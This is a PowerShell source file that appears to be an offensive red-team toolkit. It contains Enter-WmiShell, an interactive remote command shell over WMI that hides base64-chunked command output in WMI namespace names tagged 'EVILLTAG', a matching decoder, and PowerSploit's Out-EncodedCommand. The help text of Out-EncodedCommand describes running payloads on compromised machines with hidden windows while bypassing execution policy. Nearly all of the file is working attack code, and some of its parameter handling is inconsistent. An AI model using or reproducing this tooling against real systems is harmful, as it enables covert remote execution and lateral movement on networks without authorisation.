function Get-WmiShellOutput{
<#
.SYNOPSIS
Retrieve output stored in WMI namspaces and decode it.
.DESCRIPTION
Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded output, decode the retrieved data and write it to stdout.
 
.PARAMETER ComputerName 
.PARAMETER Credential
.PARAMETER UploadTo 
.PARAMETER Encoding 
.EXAMPLE
PS C:\> New-WmiShell -Credential Administrator
.NOTES
Version: 1.0
Author : Jesse "RBOT" Davis
.INPUTS
.OUTPUTS
.LINK
#>

[CmdLetBinding()]

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateSet("Base64", "Hex")]
		[string]$Encoding
	) #End Param
	
	$getOutput = @() #-Credential $UserName 
	$getOutput = Get-WmiObject -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
	
	if ([BOOL]$getOutput.Length) {
		
		#Read string objects into array, then sort them
		$getStrings = for ($i = 0; $i -lt $getOutput.Length; $i++) { $getOutput[$i].Name }
		$sortStrings = $getStrings | Sort-Object
			
            #Decode Base64 output
			foreach ($line in $sortStrings) {
	
				#Replace non-base64 characters
				$cleanString = $line.Remove(0, 14) -replace [char]0x00F3,'\+' -replace '_','/'
				
				# Decode base64 padded string and remove front side spaces
				Try { $decodeString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString)) }
		        Catch [System.Management.Automation.MethodInvocationException] {
			        Try { $decodeString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
			        Catch [System.Management.Automation.MethodInvocationException] {
			               $decodeString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
			        Finally {}
		        }
		        Finally { $decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)}
                Write-Host $decodedOutput
	        }
        }	

	else {
        #Decode single line Base64
		$getStrings = $getOutput.Name
		$cleanString = $getStrings.Remove(0, 14) -replace [char]0x00F3,'\+' -replace '_','/'
		Try { $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString)) }
		Catch [System.Management.Automation.MethodInvocationException] {
			Try { $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
			Catch [System.Management.Automation.MethodInvocationException] {
			    $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
			Finally {}
		}
		Finally { Write-Host $decodedOutput.Remove(0, 8) }    
    }
}
function Out-EncodedCommand {
<#
.SYNOPSIS

Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.

PowerSploit Function: Out-EncodedCommand
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-EncodedCommand prepares a PowerShell script such that it can be pasted into a command prompt. The scenario for using this tool is the following: You compromise a machine, have a shell and want to execute a PowerShell script as a payload. This technique eliminates the need for an interactive PowerShell 'shell' and it bypasses any PowerShell execution policies.

.PARAMETER ScriptBlock

Specifies a scriptblock containing your payload.

.PARAMETER Path

Specifies the path to your payload.

.PARAMETER NoExit

Outputs the option to not exit after running startup commands.

.PARAMETER NoProfile

Outputs the option to not load the Windows PowerShell profile.

.PARAMETER NonInteractive

Outputs the option to not present an interactive prompt to the user.

.PARAMETER Wow64

Calls the x86 (Wow64) version of PowerShell on x86_64 Windows installations.

.PARAMETER WindowStyle

Outputs the option to set the window style to Normal, Minimized, Maximized or Hidden.

.PARAMETER EncodedOutput

Base-64 encodes the entirety of the output. This is usually unnecessary and effectively doubles the size of the output. This option is only for those who are extra paranoid.

.EXAMPLE

C:\PS> Out-EncodedCommand -ScriptBlock {Write-Host 'hello, world!'}

powershell -C sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Cy/KLEnV9cgvLlFQz0jNycnXUSjPL8pJUVQHAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

.EXAMPLE

C:\PS> Out-EncodedCommand -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput

powershell -NoP -NonI -W Hidden -E cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcATABjAGkAeABDAHMASQB3AEUAQQBEAFEAWAAzAEUASQBWAEkAYwBtAEwAaQA1AEsAawBGAEsARQA2AGwAQgBCAFIAWABDADgAaABLAE8ATgBwAEwAawBRAEwANAAzACsAdgBRAGgAdQBqAHkAZABBADkAMQBqAHEAcwAzAG0AaQA1AFUAWABkADAAdgBUAG4ATQBUAEMAbQBnAEgAeAA0AFIAMAA4AEoAawAyAHgAaQA5AE0ANABDAE8AdwBvADcAQQBmAEwAdQBYAHMANQA0ADEATwBLAFcATQB2ADYAaQBoADkAawBOAHcATABpAHMAUgB1AGEANABWAGEAcQBVAEkAagArAFUATwBSAHUAVQBsAGkAWgBWAGcATwAyADQAbgB6AFYAMQB3ACsAWgA2AGUAbAB5ADYAWgBsADIAdAB2AGcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=

Description
-----------
Execute the above payload for the lulz. >D

.NOTES

This cmdlet was inspired by the createcmd.ps1 script introduced during Dave Kennedy and Josh Kelley's talk, "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)

.LINK

http://www.exploit-monday.com
#>

    [CmdletBinding( DefaultParameterSetName = 'FilePath')] Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Switch]
        $NoExit,

        [Switch]
        $NoProfile,

        [Switch]
        $NonInteractive,

        [Switch]
        $Wow64,

        [ValidateSet('Normal', 'Minimized', 'Maximized', 'Hidden')]
        [String]
        $WindowStyle,

        [Switch]
        $EncodedOutput
    )

    if ($PSBoundParameters['Path'])
    {
        Get-ChildItem $Path -ErrorAction Stop | Out-Null
        $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
    }
    else
    {
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
    }

    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    # Generate the code that will decompress and execute the payload.
    # This code is intentionally ugly to save space.
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

    # Base-64 strings passed to -EncodedCommand must be unicode encoded.
    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))

    # Build the command line options
    # Use the shortest possible command-line arguments to save space. Thanks @obscuresec for the idea.
    $CommandlineOptions = New-Object String[](0)
    if ($PSBoundParameters['NoExit'])
    { $CommandlineOptions += '-NoE' }
    if ($PSBoundParameters['NoProfile'])
    { $CommandlineOptions += '-NoP' }
    if ($PSBoundParameters['NonInteractive'])
    { $CommandlineOptions += '-NonI' }
    if ($PSBoundParameters['WindowStyle'])
    { $CommandlineOptions += "-W $($PSBoundParameters['WindowStyle'])" }

    $CmdMaxLength = 8190

    # Build up the full command-line string. Default to outputting a fully base-64 encoded command.
    # If the fully base-64 encoded output exceeds the cmd.exe character limit, fall back to partial
    # base-64 encoding to save space. Thanks @Carlos_Perez for the idea.
    if ($PSBoundParameters['Wow64'])
    {
        $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }
    else
    {
        $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }

    if ($CommandLineOutput.Length -gt $CmdMaxLength)
    {
            Write-Warning 'This command exceeds the cmd.exe maximum allowed length!'
    }

    Write-Output $CommandLineOutput
}
function Enter-WmiShell{

    Param (	
        [Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		
        [Parameter()]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
	) # End Param
     
        # Start WmiShell prompt
        $command = ""
        do{ 
            # Make a pretty prompt for the user to provide commands at
            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green 
            $command = Read-Host

            # Execute commands on remote host 
            switch ($command) {
               "exit" { 
                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
                    -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                }
                default { 
                    $remoteScript = @"
                    `$wshell = New-Object -c WScript.Shell
                    function Insert-Piece(`$i, `$piece) {
                            `$count = `$i.ToString()
	                    `$zeros = "0" * (6 - `$count.Length)
	                        `$tag = "EVILLTAG" + `$zeros + `$count
	                        `$piece = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$piece))
                            `$piece = `$piece -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
	                        `$piece = `$tag + `$piece 
	                        `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
                            Start-Sleep -m 50
                        }
                        `$null = `$wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name LIKE 'OUTPUT_READY' OR Name like '%EVILLTAG%'"" delete")
	                    `$cmdExec = `$wshell.Exec("%comspec% /c " + "$command") 
	                    `$cmdOut = `$cmdExec.StdOut.ReadAll()
	                    `$j = `$nbr = [Math]::Floor(`$cmdOut.Length/3000)
                        while(`$j -gt 0) {
                            `$i++
	                        `$piece = `$cmdOut.Substring(0,3000)
		                    `$piece = "        " + `$piece + "        "
		                    `$cmdOut = `$cmdOut.Substring(3000,(`$cmdOut.Length - 3000))
                            Write-Host `$piece.Length
		                    Insert-Piece `$i `$piece
                            `$j--
                        }
	                    `$cmdOut = "        " + `$cmdOut + "        "
                        Write-Host `$cmdOut.Length
	                    Insert-Piece (`$nbr + 1) `$cmdOut 
	                    `$null = `$wShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='OUTPUT_READY'")
"@
                    $scriptBlock = [scriptblock]::Create($remoteScript)
                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -NoExit -ScriptBlock $scriptBlock
                    $null = Invoke-WmiMethod -Class win32_process -Name create -ArgumentList $encPosh
                    
                    #-ComputerName $ComputerName -Credential $UserName

                    # Wait for vbScrpit to finish writing output to WMI namespaces
                    Start-Sleep -Seconds 1
                    $outputReady = ""
                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                    until($outputReady)

                    # Retrieve cmd output written to WMI namespaces 
                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName
                }
            }
        }until($command -eq "exit")
}
